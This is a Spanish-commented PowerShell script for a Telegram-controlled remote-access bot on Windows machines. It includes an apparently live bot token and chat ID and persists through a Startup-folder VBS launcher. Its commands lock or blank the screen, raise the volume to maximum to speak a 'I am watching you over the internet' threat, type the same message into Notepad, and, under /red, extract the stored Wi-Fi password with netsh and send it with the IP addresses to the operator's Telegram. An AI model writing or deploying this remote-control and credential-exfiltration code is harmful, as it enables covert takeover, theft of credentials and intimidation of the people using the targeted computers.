# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM (Pon tus datos aquí)
# ==============================================================================
$Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TOKEN REAL COMPLETO
$ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO

# Construcción de URL fija ultra-estable que acabamos de validar
$URL    = "https://api.telegram.org/bot" + $Token
$MiPC   = $env:COMPUTERNAME
$User   = $env:USERNAME
# ==============================================================================
# NO BORRAR #############################################################
# ==============================================================================
# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM 
# ==============================================================================
# Registrar APIs de pantalla de Windows de forma segura
try {
    $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
} catch {}

# Habilitar TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ==============================================================================
# LIMPIAR HISTORIAL ANTES DE INICIAR
# ==============================================================================
$LastUpdateID = 0
try {
    $PreCheck = Invoke-RestMethod -Uri "$URL/getUpdates?timeout=1" -Method Get
    if ($PreCheck.result.Count -gt 0) {
        $LastUpdateID = $PreCheck.result[-1].update_id + 1
        [void](Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=1" -Method Get)
    }
} catch {}

# --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
try {
    $MensajeInicio = " Ver 7 PC En Linea y Protegida: " + $User + "@" + $MiPC
    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio })
} catch {}

# ==============================================================================
# BUCLE PRINCIPAL CON SISTEMA DE IDS NUMÉRICOS CORREGIDO
# ==============================================================================
while ($true) {
    try {
        $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
        
                foreach ($Update in $Updates.result) {
            $LastUpdateID = $Update.update_id + 1
            $TextoRecibido = $Update.message.text
            $RemitenteChatID = $Update.message.chat.id

            if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                
                # 1. Separar el texto por espacios de forma estricta
                $Partes = $TextoRecibido -split " "
                
                # OBLIGATORIO: Extraer solo la primera palabra (El comando) usando [0]
                $Comando = [string]$Partes[0]
                $Comando = $Comando.ToLower()
                
                # OBLIGATORIO: Extraer la segunda palabra (El ID de la PC) usando [1]
                $IDDestino = ""
                if ($Partes.Count -gt 1) {
                    $IDDestino = [string]$Partes[1]
                }

                # CÁLCULO UNIFICADO DE ID ÚNICO DE 3 DÍGITOS
                $Md5 = [System.Security.Cryptography.MD5]::Create()
                $HashBytes = $Md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($MiPC))
                $IdUnico = ([BitConverter]::ToUInt16($HashBytes, 0) % 900) + 100
                $MiIDNum = [string]$IdUnico


                # --- COMANDO GLOBAL: /lista ---
                if ($Comando -eq "/lista") {
                    $RespuestaLista = "ver 6 EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                    continue
                }

                # --- COMANDO GLOBAL DE AYUDA: /ayuda ---
                if ($Comando -eq "/ayuda") {
                    $TextoAyuda = "MANUAL DE CONTROL NUMERICO`n`n" +
                                  "Comandos Globales:`n" +
                                  "• /lista - Ver que numero de ID tomo cada PC.`n" +
                                  "• /ayuda - Ver este menu.`n`n" +
                                  "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
                                  "• /pantalla_off [Numero]`n" +
                                  "• /pantalla_on [Numero]`n" +
                                  "• /notepad [Numero]`n`n" +
                                  "Ejemplo de uso: /notepad " + $MiIDNum
                    
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                    continue
                }

                # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                 
                 switch ($Comando) {
                 
                        "/pantalla_off" {
                            $rundll = New-Object -ComObject WScript.Shell
                            $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
                            [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
                            continue
                        }
                        
                        "/pantalla_on" {
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("{SHIFT}")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                            continue
                        }
                                             "/youtube" {
                            # CAMBIÁ ESTE ENLACE: Poné entre comillas la URL fija que vos quieras
                            $UrlFija = "https://youtube.com"

                            # Abre el navegador directo con tu video predefinido
                            Start-Process $UrlFija
                            
                            $Respuesta = "Abriendo el video predefinido de YouTube en ID $MiIDNum"
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                            continue
                        }
                        "/hablar" {
                            # 1. Creamos el objeto de control del sistema de Windows
                            $wshShell = New-Object -ComObject WScript.Shell
                            
                            # 2. Sube el volumen al 100% (Manda la señal de 'Subir Volumen' 50 veces seguidas)
                            for ($i = 0; $i -lt 50; $i++) {
                                $wshShell.SendKeys([char]175)
                            }

                            # 3. CAMBIÁ ESTA FRASE: Poné entre comillas lo que querés que diga la PC
                            $FraseFija = "Alerta del sistema. Te estoy observando por internet."

                            # 4. Invoca el motor de voz de Windows y reproduce el texto fijo
                            $Voice = New-Object -ComObject SAPI.SpVoice
                            [void]$Voice.Speak($FraseFija)
                            
                            # 5. Notificación de éxito a Telegram
                            $Respuesta = "Volumen maximizado y frase reproducida en ID $MiIDNum"
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                            continue
                        }                        "/actualizar" {
                            $Respuesta = "🔄 Descargando última versión desde GitHub y reiniciando bot en ID $MiIDNum..."
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                            
                            # 1. Espera un segundo para que el mensaje de Telegram se envíe por completo
                            Start-Sleep -Seconds 1
                            
                            # 2. Ejecuta el actualizador cliente.ps1 usando el VBS de la carpeta de Inicio
                            $RutaInicio = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\iniciar_cliente.vbs"
                            if (Test-Path $RutaInicio) {
                                Start-Process "wscript.exe" -ArgumentList "`"$RutaInicio`""
                            }
                            
                            # 3. ELIMINACIÓN DE MEMORIA VIEJA: Mata al bot actual de inmediato
                            # Esto deja el camino totalmente libre para que el nuevo script tome el control sin pisarse
                            Stop-Process -Id $PID -Force
                            continue
                        }




                        "/notepad" {
                            Start-Process "notepad.exe"
                            Start-Sleep -Milliseconds 500
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("Te estoy observando por Internet... 👀")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                            continue # 👈 CORREGIDO: Esto evita que se choque con el comando /red
                        }
                        
                                                                         "/red" {
                            # 1. Detectar la placa de red real con conexion activa
                            $RutaActiva = Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Select-Object -First 1
                            
                            $NombreInterfaz = "No detectada"
                            $IpPrivada = "No detectada"
                            $NombreWiFi = "No conectado (Es cable Ethernet)"
                            $ClaveWiFi = "No aplica"

                            if ($RutaActiva) {
                                $NombreInterfaz = $RutaActiva.InterfaceAlias
                                $IpPrivada = (Get-NetIPAddress -InterfaceIndex $RutaActiva.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue).IPAddress
                                
                                # 2. Si esta usando Wi-Fi, extraer el nombre de la red y su contraseña
                                if ($NombreInterfaz -like "*Wi-Fi*" -or $NombreInterfaz -like "*Wireless*") {
                                    # Obtiene el nombre del perfil de red activo
                                    $Perfil = (netsh wlan show interfaces | Select-String -Pattern "^\s+SSID\s+:\s+(.+)$")
                                    if ($Perfil) {
                                        $NombreWiFi = $Perfil.Matches.Groups[1].Value.Trim()
                                        
                                        # Comando nativo para revelar la clave guardada de ese perfil específico
                                        $XmlInfo = (netsh wlan show profile name="$NombreWiFi" key=clear | Select-String -Pattern "Contenido de la clave\s+:\s+(.+)$")
                                        if ($XmlInfo) {
                                            $ClaveWiFi = $XmlInfo.Matches.Groups[1].Value.Trim()
                                        } else {
                                            $ClaveWiFi = "No encontrada o red abierta"
                                        }
                                    }
                                }
                            }

                            # 3. Obtener la IP Publica
                            $IpPublica = "Desconocida"
                            try {
                                $IpPublica = (Invoke-RestMethod -Uri "https://icanhazip.com" -TimeoutSec 5).Trim()
                            } catch {}

                            # 4. Armar el reporte de texto plano seguro
                            $ReporteRed = "REPORTE DE RED (ID: $MiIDNum)`nAdaptador: $NombreInterfaz`nNombre Wi-Fi: $NombreWiFi`nClave Wi-Fi: $ClaveWiFi`nIP Privada: $IpPrivada`nIP Publica: $IpPublica"
                                          
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $ReporteRed })
                            continue
                        }






                    } # Cierre limpio del switch
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 3
    }
    Start-Sleep -Seconds 2
}

